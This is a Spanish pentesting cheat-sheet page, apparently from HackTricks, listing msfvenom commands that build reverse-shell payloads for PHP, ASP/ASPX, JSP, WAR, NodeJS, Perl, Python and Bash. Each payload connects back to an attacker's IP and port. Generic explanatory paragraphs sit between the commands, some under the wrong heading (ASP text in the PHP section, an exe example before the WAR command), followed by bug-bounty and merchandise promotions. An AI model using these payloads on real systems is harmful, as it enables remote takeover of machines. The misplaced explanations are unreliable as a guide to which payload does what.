## **Cargas útiles basadas en la web**

### **PHP**

#### Shell inversa
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
El shell inverso es una técnica utilizada en hacking para establecer una conexión remota entre el atacante y la víctima. En el caso de ASP/x, se utiliza para obtener acceso a un sistema que ejecuta una aplicación ASP. 

El shell inverso se puede lograr utilizando la herramienta `msfvenom` de Metasploit Framework. `msfvenom` es una herramienta de generación de payloads que permite crear payloads personalizados para explotar vulnerabilidades en sistemas objetivo. 

Para crear un payload de shell inverso ASP/x con `msfvenom`, se puede utilizar el siguiente comando:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_DEL_ATACANTE> LPORT=<PUERTO_DEL_ATACANTE> -f asp > shell.asp
```

Donde `<IP_DEL_ATACANTE>` es la dirección IP del atacante y `<PUERTO_DEL_ATACANTE>` es el puerto en el que el atacante está escuchando para establecer la conexión. 

Una vez que se haya generado el archivo `shell.asp`, se puede cargar en el sistema objetivo para establecer la conexión inversa. Esto permitirá al atacante ejecutar comandos en el sistema objetivo de forma remota.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
El shell inverso es una técnica utilizada en hacking para establecer una conexión remota entre un atacante y una máquina comprometida. Esto permite al atacante ejecutar comandos en la máquina comprometida de forma remota.

En el caso de JSP (JavaServer Pages), podemos utilizar la herramienta `msfvenom` de Metasploit para generar un payload JSP que establezca una conexión de shell inverso.

El siguiente comando genera un payload JSP utilizando `msfvenom`:

```plaintext
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f raw > shell.jsp
```

Reemplaza `<attacker IP>` con la dirección IP del atacante y `<attacker port>` con el puerto que el atacante desea utilizar para la conexión de shell inverso.

Una vez que se haya generado el archivo `shell.jsp`, puedes cargarlo en un servidor web y acceder a él desde la máquina comprometida. Esto ejecutará el payload JSP y establecerá la conexión de shell inverso con el atacante.

Es importante tener en cuenta que el uso de técnicas de hacking como el shell inverso puede ser ilegal y está sujeto a sanciones legales. Solo debes utilizar estas técnicas en entornos controlados y con el permiso explícito del propietario del sistema.
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
El shell inverso es una técnica utilizada en hacking para establecer una conexión remota entre un atacante y una máquina comprometida. Esto permite al atacante ejecutar comandos en la máquina comprometida y obtener acceso a su sistema.

El shell inverso se puede lograr utilizando diferentes métodos y herramientas. Una de las herramientas más populares para generar un shell inverso es `msfvenom`, que es parte del marco de trabajo Metasploit.

`msfvenom` es una herramienta de generación de payloads que se utiliza para crear código malicioso. Puede generar diferentes tipos de payloads, incluyendo shells inversos, que se pueden utilizar en ataques de hacking.

Para generar un payload de shell inverso utilizando `msfvenom`, se deben especificar ciertos parámetros, como la dirección IP y el puerto al que se desea conectar el shell inverso. A continuación se muestra un ejemplo de cómo generar un payload de shell inverso utilizando `msfvenom`:

```plaintext
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_DEL_ATACANTE> LPORT=<PUERTO_DEL_ATACANTE> -f exe > shell.exe
```

En el ejemplo anterior, `windows/meterpreter/reverse_tcp` es el tipo de payload que se utilizará para el shell inverso. `<IP_DEL_ATACANTE>` debe reemplazarse por la dirección IP del atacante y `<PUERTO_DEL_ATACANTE>` debe reemplazarse por el puerto al que el atacante desea conectarse.

Una vez que se haya generado el payload de shell inverso, se puede enviar a la máquina comprometida y ejecutarlo. Esto establecerá una conexión entre el atacante y la máquina comprometida, lo que permitirá al atacante controlar el sistema comprometido y ejecutar comandos en él.

Es importante tener en cuenta que el uso de técnicas de shell inverso para acceder a sistemas sin autorización es ilegal y puede tener consecuencias legales graves. El shell inverso solo debe utilizarse con fines educativos o en entornos controlados, como pruebas de penetración autorizadas.
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS

NodeJS es una plataforma de desarrollo de aplicaciones de servidor que utiliza JavaScript como lenguaje de programación. Es conocido por su capacidad para manejar una gran cantidad de conexiones simultáneas y su eficiencia en el manejo de operaciones de entrada/salida. NodeJS utiliza el motor de JavaScript V8 de Google Chrome para ejecutar código JavaScript en el servidor.

#### Creación de payloads con msfvenom

Msfvenom es una herramienta de Metasploit que se utiliza para generar payloads personalizados. Un payload es un fragmento de código malicioso que se utiliza para explotar una vulnerabilidad en un sistema objetivo. Msfvenom permite generar payloads para una amplia variedad de plataformas y arquitecturas.

Para crear un payload con msfvenom, se utiliza el siguiente comando:

```
msfvenom -p <payload> <opciones> -f <formato> -o <archivo de salida>
```

Donde:

- `<payload>`: especifica el tipo de payload que se va a generar, como `windows/meterpreter/reverse_tcp` o `linux/x86/meterpreter/reverse_tcp`.
- `<opciones>`: se utilizan para configurar el payload, como la dirección IP y el puerto del atacante.
- `<formato>`: especifica el formato de salida del payload, como `exe`, `elf` o `raw`.
- `<archivo de salida>`: especifica el nombre y la ubicación del archivo de salida que contendrá el payload generado.

Una vez que se ha generado el payload, se puede utilizar en una variedad de escenarios de hacking, como la explotación de vulnerabilidades o la creación de backdoors en sistemas comprometidos.

Es importante tener en cuenta que el uso de msfvenom para generar y utilizar payloads maliciosos puede ser ilegal y está sujeto a las leyes y regulaciones locales. Se recomienda utilizar estas técnicas solo con fines educativos y éticos, y obtener el consentimiento adecuado antes de realizar cualquier actividad de hacking.
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **Cargas útiles de lenguaje de script**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**

Python es un lenguaje de programación de alto nivel ampliamente utilizado en el campo de la ciberseguridad. Es conocido por su sintaxis clara y legible, lo que lo hace ideal para escribir scripts y herramientas de hacking. Python ofrece una amplia gama de bibliotecas y módulos que facilitan el desarrollo de herramientas de hacking eficientes y potentes.

#### **Msfvenom**

Msfvenom es una herramienta de Metasploit Framework que se utiliza para generar payloads personalizados. Un payload es un fragmento de código malicioso que se ejecuta en la máquina objetivo después de una explotación exitosa. Msfvenom permite a los hackers generar payloads para una amplia variedad de plataformas y arquitecturas.

#### **Generación de payloads con Msfvenom**

Para generar un payload con msfvenom, se utiliza el siguiente comando:

```
msfvenom -p <payload> <opciones> -f <formato> -o <archivo de salida>
```

- `<payload>`: especifica el tipo de payload que se generará, como `windows/meterpreter/reverse_tcp` o `linux/x86/shell_reverse_tcp`.
- `<opciones>`: proporciona opciones adicionales para personalizar el payload, como la dirección IP y el puerto de escucha.
- `<formato>`: especifica el formato de salida del payload, como `exe`, `elf` o `raw`.
- `<archivo de salida>`: especifica el nombre y la ubicación del archivo de salida que contendrá el payload generado.

Una vez que se genera el payload, se puede utilizar en una explotación para obtener acceso no autorizado a la máquina objetivo. Es importante tener en cuenta que el uso de payloads maliciosos sin el consentimiento del propietario del sistema es ilegal y puede tener consecuencias legales graves.

#### **Conclusión**

Python y msfvenom son herramientas poderosas que pueden ser utilizadas por hackers éticos y profesionales de la seguridad para realizar pruebas de penetración y evaluar la seguridad de los sistemas. Sin embargo, es importante utilizar estas herramientas de manera responsable y ética, y obtener siempre el consentimiento del propietario del sistema antes de realizar cualquier prueba de penetración.
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**

Bash es un intérprete de comandos de Unix y un lenguaje de scripting que se utiliza ampliamente en sistemas operativos basados en Unix. Es una de las shells más populares y se utiliza comúnmente en la programación de scripts, la administración del sistema y la automatización de tareas.

Bash proporciona una amplia gama de características y funcionalidades, lo que lo convierte en una herramienta poderosa para los hackers. Algunas de las características más útiles de Bash incluyen:

- **Historial de comandos**: Bash mantiene un historial de los comandos ejecutados, lo que facilita la repetición de comandos anteriores o la búsqueda de comandos específicos.

- **Completado de pestañas**: Bash ofrece la capacidad de completar automáticamente los comandos y nombres de archivos utilizando la tecla de pestaña, lo que ahorra tiempo y reduce los errores tipográficos.

- **Redirección de entrada/salida**: Bash permite redirigir la entrada y salida de los comandos, lo que es útil para redirigir la salida a un archivo o leer la entrada desde un archivo en lugar del teclado.

- **Variables y expansión de comandos**: Bash admite variables y la expansión de comandos, lo que permite almacenar valores y utilizarlos en los comandos o scripts.

- **Funciones**: Bash permite definir y utilizar funciones, lo que facilita la reutilización de código y la organización de tareas complejas.

- **Control de flujo**: Bash proporciona estructuras de control de flujo, como bucles y condicionales, que permiten tomar decisiones y repetir tareas según sea necesario.

Estas características hacen de Bash una herramienta valiosa para los hackers, ya que les permite automatizar tareas, manipular datos y ejecutar comandos de forma eficiente.
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof es el hogar de todas las recompensas por errores de criptografía.**

**Obtén recompensas sin demoras**\
Las recompensas de HackenProof se lanzan solo cuando sus clientes depositan el presupuesto de recompensa. Obtendrás la recompensa después de que se verifique el error.

**Obtén experiencia en pentesting web3**\
¡Los protocolos de blockchain y los contratos inteligentes son el nuevo Internet! Domina la seguridad web3 en sus días de crecimiento.

**Conviértete en la leyenda del hacker web3**\
Gana puntos de reputación con cada error verificado y conquista la cima de la clasificación semanal.

[**Regístrate en HackenProof**](https://hackenproof.com/register) ¡comienza a ganar con tus hacks!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
